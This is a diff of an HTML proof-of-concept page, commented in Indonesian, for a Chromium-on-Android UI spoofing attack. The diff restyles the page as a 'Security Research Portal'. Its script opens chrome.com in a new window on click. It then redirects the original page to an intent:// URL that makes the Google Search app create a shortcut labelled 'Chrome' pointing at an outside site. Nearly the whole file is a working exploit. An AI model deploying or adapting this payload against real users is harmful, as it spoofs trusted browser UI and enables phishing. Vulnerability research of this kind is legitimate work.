@@ -3,65 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC UI Spoofing & Google Redirect</title>
+    <title>Chromium Android UI Spoofing & Intent PoC</title>
     <style>
+        :root {
+            --primary-color: #1a73e8;
+            --primary-hover: #1557b0;
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-main: #202124;
+            --text-secondary: #5f6368;
+            --border-color: #dadce0;
+        }
+
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
             text-align: center;
-            padding: 50px;
-            background-color: #f4f4f9;
         }
+
+        .card {
+            background: var(--card-bg);
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            border: 1px solid var(--border-color);
+            max-width: 420px;
+            width: 100%;
+        }
+
+        .banner {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+        }
+
         h1 {
-            color: #333;
+            font-size: 22px;
+            color: var(--text-main);
+            margin-top: 0;
+            margin-bottom: 12px;
         }
-        .container {
-            margin-top: 30px;
+
+        p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 28px;
+            line-height: 1.5;
         }
+
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
         a.button-link {
             display: inline-block;
-            margin: 15px;
-            padding: 14px 28px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            background-color: #1a73e8;
+            background-color: var(--primary-color);
             color: white;
-            border: none;
-            border-radius: 6px;
+            padding: 14px 24px;
             text-decoration: none;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            transition: background 0.2s;
+            font-weight: 600;
+            font-size: 14px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
+            transition: background-color 0.2s, transform 0.1s;
+            cursor: pointer;
         }
+
         a.button-link:hover {
-            background-color: #1557b0;
+            background-color: var(--primary-hover);
+        }
+
+        a.button-link:active {
+            transform: scale(0.98);
+        }
+
+        .status-box {
+            margin-top: 20px;
+            padding: 10px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            background: #f1f3f4;
+            border-radius: 6px;
+            display: none;
+            word-break: break-all;
+        }
+
+        .footer-note {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #9aa0a6;
         }
     </style>
 </head>
 <body>
 
-    <h1>Chromium Android UI Spoofing PoC</h1>
-    <p>Silakan long-press tautan di bawah dan pilih "Open in new window":</p>
+    <div class="card">
+        <div class="banner">Security Research Portal</div>
+        <h1>Chromium UI Spoofing</h1>
+        <p>Silakan klik atau long-press tautan di bawah ini untuk menguji vektor intent redirection.</p>
 
-    <div class="container">
-        <!-- Tautan: Panel atas akan membuka chrome.com karena href diset ke https://www.chrome.com -->
-        <div>
+        <div class="button-container">
+            <!-- Tautan dengan atribut keamanan target -->
             <a href="https://www.chrome.com" 
                class="button-link" 
-               id="spoofLink"
+               id="spoofLink" 
                target="_blank" 
-               rel="noopener noreferrer">
-                Open New Window (Chrome Context)
+               rel="noopener noreferrer"
+               data-intent="intent_app_spoof">
+                Open New Window & Trigger Intent
             </a>
         </div>
+
+        <div class="status-box" id="statusBox">Status: Ready...</div>
     </div>
 
+    <div class="footer-note">Authorized security assessment environment.</div>
+
     <script>
-        document.getElementById('spoofLink').addEventListener('click', function(e) {
-            // Panel Bawah (halaman ini) akan merespons klik dengan melakukan redirect 
-            // ke URL Google Redirect APK setelah jeda singkat (misal 500ms)
+        const spoofLink = document.getElementById('spoofLink');
+        const statusBox = document.getElementById('statusBox');
+        let executed = false;
+
+        spoofLink.addEventListener('click', function(e) {
+            // Mencegah eksekusi ganda yang tidak perlu
+            if (executed) return;
+            executed = true;
+
+            statusBox.style.display = 'block';
+            statusBox.innerText = 'Status: Initializing intent sequence...';
+
+            // Jeda optimal (misal 300ms) untuk memastikan context window target terbuka 
+            // sebelum halaman utama mengalihkan navigasi ke skema intent Android.
             setTimeout(function() {
-                window.location.href = 'intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end';
-            }, 500);
+                try {
+                    const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                    
+                    statusBox.innerText = 'Status: Redirecting to intent scheme...';
+                    window.location.href = intentUrl;
+                } catch (err) {
+                    statusBox.innerText = 'Status: Error - ' + err.message;
+                    executed = false;
+                }
+            }, 300);
         });
     </script>
 
